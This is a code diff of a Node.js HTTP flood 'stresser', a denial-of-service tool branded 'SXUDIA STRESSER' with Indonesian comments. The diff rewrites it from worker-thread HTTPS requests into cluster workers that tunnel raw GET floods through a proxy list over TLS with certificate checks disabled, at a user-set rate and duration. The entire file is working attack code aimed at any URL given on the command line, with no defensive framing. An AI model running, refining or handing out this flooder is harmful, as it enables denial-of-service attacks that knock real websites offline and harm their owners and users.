@@ -1,80 +1,107 @@
-const https = require('https');
+const cluster = require('cluster');
 const fs = require('fs');
-const { Worker, isMainThread, workerData } = require('worker_threads');
+const tls = require('tls');
 const { URL } = require('url');
-const { exec } = require('child_process');
 
-if (isMainThread) {
-    if (process.argv.length < 7) {
-        console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
-        process.exit(1);
+if (process.argv.length < 7) {
+    console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
+    process.exit(1);
+}
+
+const targetURL = process.argv[2];
+const duration = parseInt(process.argv[3], 10);
+const rps = parseInt(process.argv[4], 10);
+const threads = parseInt(process.argv[5], 10);
+const proxyFile = process.argv[6];
+
+let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());
+
+if (proxies.length === 0) {
+    console.error("Error: Proxy file is empty or cannot be read.");
+    process.exit(1);
+}
+
+if (cluster.isMaster) {
+    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);
+
+    for (let i = 0; i < threads; i++) {
+        cluster.fork();
     }
 
-    const target = {
-        url: process.argv[2],
-        time: parseInt(process.argv[3], 10),
-        rps: parseInt(process.argv[4], 10),
-        threads: parseInt(process.argv[5], 10),
-        proxyFile: process.argv[6]
-    };
+    setTimeout(() => {
+        console.log("Attack completed.");
+        process.exit(0);
+    }, duration * 1000);
 
-    console.log(`Starting attack on ${target.url} for ${target.time} seconds...`);
-    const worker = new Worker(__filename, { workerData: target });
-    worker.on('exit', () => console.log(`Attack on ${target.url} completed.`));
+    cluster.on('exit', (worker) => {
+        console.log(`Worker ${worker.process.pid} exited`);
+    });
 } else {
-    const { url, time, rps, threads, proxyFile } = workerData;
-    const target = new URL(url);
-    const PROXY_LIST = proxyFile ? fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim()) : [];
+    const target = new URL(targetURL);
+    const startTime = Date.now();
 
-    const HTTP_OPTIONS = {
-        hostname: target.hostname,
-        port: target.port || 443,
-        path: target.pathname,
-        method: 'GET',
-        headers: {
-            'Host': target.hostname,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
-                          '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'Connection': 'keep-alive',
-            'Accept': '*/*',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache'
-        }
-    };
+    function sendTLSRequest(proxy) {
+        const proxyParts = proxy.trim().split(":");
+        if (proxyParts.length < 2) return;
 
-    function sendRequest() {
-        const interval = setInterval(() => {
-            console.log(`SXUDIA STRESSER TELE @abibsaudia`);
+        const proxyHost = proxyParts[0];
+        const proxyPort = parseInt(proxyParts[1], 10);
 
-            // Kirim permintaan dengan semua proxy secara bersamaan
-            PROXY_LIST.forEach(proxy => {
-                const [ip, port] = proxy.split(':');  // Memisahkan IP dan Port
-                const reqOptions = {
-                    ...HTTP_OPTIONS,
-                    headers: {
-                        ...HTTP_OPTIONS.headers,
-                        'Proxy': `http://${ip}:${port}` // Menggunakan IP dan Port dari file proxy.txt
-                    }
-                };
+        const options = {
+            host: proxyHost,
+            port: proxyPort,
+            servername: target.hostname,
+            rejectUnauthorized: false
+        };
 
-                const req = https.request(reqOptions, res => {
-                    res.on('data', () => {});
-                });
+        const client = tls.connect(options, () => {
+            function flood() {
+                if (Date.now() - startTime >= duration * 1000) {
+                    console.log(`Worker ${process.pid} stopping attack.`);
+                    process.exit(0);
+                }
 
-                req.on('error', err => {
-                    // Tangani error jika diperlukan
-                });
+                for (let i = 0; i < rps; i++) {
+                    const request = `GET ${target.pathname} HTTP/1.1\r\n` +
+                                    `Host: ${target.hostname}\r\n` +
+                                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
+                                    "Accept: */*\r\n" +
+                                    "Connection: keep-alive\r\n\r\n";
+                    client.write(request);
+                }
 
-                req.setTimeout(0); // Nonaktifkan timeout, menghindari penundaan
-                req.end();
-            });
-        }, 1000);
+                setTimeout(flood, 10); // Delay kecil untuk mengurangi beban CPU
+            }
+            flood();
+        });
 
-        // Menghentikan pengiriman request setelah waktu yang ditentukan
-        setTimeout(() => clearInterval(interval), time * 1000);
+        client.on("error", () => {
+            client.destroy();
+        });
+
+        client.on("close", () => {
+            client.destroy();
+        });
     }
 
-    // Mulai mengirim permintaan
-    sendRequest();
+    function attackLoop() {
+        if (Date.now() - startTime >= duration * 1000) {
+            console.log(`Worker ${process.pid} stopping attack.`);
+            process.exit(0);
+        }
+
+        // Kirim permintaan ke target menggunakan semua proxy secara bersamaan
+        proxies.forEach(proxy => {
+            sendTLSRequest(proxy);
+        });
+
+        setTimeout(attackLoop, 10); // Delay kecil agar CPU tidak overload
+    }
+
+    process.on('uncaughtException', (err) => {
+        console.error('Uncaught exception:', err);
+        process.exit(1);
+    });
+
+    attackLoop();
 }
